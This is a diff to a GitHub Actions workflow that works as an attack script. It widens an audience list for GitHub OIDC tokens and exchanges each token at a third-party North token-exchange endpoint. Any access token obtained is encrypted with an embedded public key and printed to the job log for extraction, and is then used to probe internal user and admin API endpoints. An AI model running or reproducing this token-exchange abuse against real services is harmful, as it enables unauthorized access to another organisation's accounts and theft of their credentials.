@@ -8,7 +8,7 @@ jobs:
   exchange:
     runs-on: ubuntu-latest
     steps:
-      - name: fetch and exchange
+      - name: audience matrix
         env:
           PUBKEY: |
             -----BEGIN PUBLIC KEY-----
@@ -23,35 +23,23 @@ jobs:
         run: |
           set +e
           echo "$PUBKEY" > /tmp/pub.pem
-          for AUD in north north.cohere.com; do
-            echo "===== audience=$AUD ====="
+          for AUD in north north.cohere.com demo.north.cohere.com north-cli north-admin cohere https://demo.north.cohere.com https://north.cohere.com api://north; do
             RESP=$(curl -sSL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
             ID_TOKEN=$(echo "$RESP" | jq -r '.value // empty')
-            if [ -z "$ID_TOKEN" ]; then echo "no token: $RESP"; continue; fi
-            echo "token_len=${#ID_TOKEN}"
-            echo "claims:"
-            echo "$ID_TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{iss,aud,sub,repository,repository_owner,workflow,ref,event_name}' || true
-            for TT in urn:ietf:params:oauth:token-type:id_token urn:ietf:params:oauth:token-type:access_token; do
-              echo "--- exchange type=$TT"
-              BODY=$(jq -nc --arg t "$ID_TOKEN" --arg tt "$TT" '{subject_token:$t,subject_token_type:$tt,connector_id:"githubTokenExchange"}')
-              OUT=$(curl -sS -X POST "https://demo.north.cohere.com/api/v1/token/exchange" -H 'Content-Type: application/json' -d "$BODY" -w '\nHTTP_CODE=%{http_code}')
-              CODE=$(echo "$OUT" | sed -n 's/^HTTP_CODE=//p')
-              JSON=$(echo "$OUT" | sed '$d')
-              echo "http=$CODE"
-              echo "$JSON" | jq -c 'del(.token,.access_token) | .' 2>/dev/null | head -c 1200 || echo "$JSON" | head -c 800
-              echo
-              NORTH_TOKEN=$(echo "$JSON" | jq -r '.token // .access_token // empty' 2>/dev/null)
-              if [ -n "$NORTH_TOKEN" ]; then
-                echo "GOT_NORTH_TOKEN len=${#NORTH_TOKEN}"
-                echo "$NORTH_TOKEN" | openssl pkeyutl -encrypt -pubin -inkey /tmp/pub.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0 > /tmp/enc.txt
-                echo "TOKEN_ENC=$(cat /tmp/enc.txt)"
-                echo "--- users/me"
-                curl -sS "https://demo.north.cohere.com/api/internal/v1/users/me" -H "Authorization: Bearer $NORTH_TOKEN" -w '\nHTTP=%{http_code}\n' | head -c 1200
-                echo "--- admin whoami"
-                curl -sS "https://demo.north.cohere.com/admin/api/auth/whoami" -H "Authorization: Bearer $NORTH_TOKEN" -w '\nHTTP=%{http_code}\n' | head -c 800
-                echo "--- admin users"
-                curl -sS "https://demo.north.cohere.com/admin/api/users" -H "Authorization: Bearer $NORTH_TOKEN" -w '\nHTTP=%{http_code}\n' | head -c 500
-                exit 0
-              fi
-            done
+            if [ -z "$ID_TOKEN" ]; then echo "AUD=$AUD NO_TOKEN"; continue; fi
+            BODY=$(jq -nc --arg t "$ID_TOKEN" '{subject_token:$t,subject_token_type:"urn:ietf:params:oauth:token-type:id_token",connector_id:"githubTokenExchange"}')
+            OUT=$(curl -sS -X POST "https://demo.north.cohere.com/api/v1/token/exchange" -H 'Content-Type: application/json' -d "$BODY" -w '\nHTTP_CODE=%{http_code}')
+            CODE=$(echo "$OUT" | sed -n 's/^HTTP_CODE=//p')
+            JSON=$(echo "$OUT" | sed '$d')
+            ERR=$(echo "$JSON" | jq -r '.details.error // .error_code // empty' 2>/dev/null)
+            echo "AUD=$AUD HTTP=$CODE ERR=$ERR"
+            NORTH_TOKEN=$(echo "$JSON" | jq -r '.token // .access_token // empty' 2>/dev/null)
+            if [ -n "$NORTH_TOKEN" ]; then
+              echo "GOT_NORTH_TOKEN aud=$AUD len=${#NORTH_TOKEN}"
+              echo "$NORTH_TOKEN" | openssl pkeyutl -encrypt -pubin -inkey /tmp/pub.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0 > /tmp/enc.txt
+              echo "TOKEN_ENC=$(cat /tmp/enc.txt)"
+              curl -sS "https://demo.north.cohere.com/api/internal/v1/users/me" -H "Authorization: Bearer $NORTH_TOKEN" -w '\nHTTP=%{http_code}\n' | head -c 1200
+              curl -sS "https://demo.north.cohere.com/admin/api/auth/whoami" -H "Authorization: Bearer $NORTH_TOKEN" -w '\nHTTP=%{http_code}\n' | head -c 800
+              exit 0
+            fi
           done
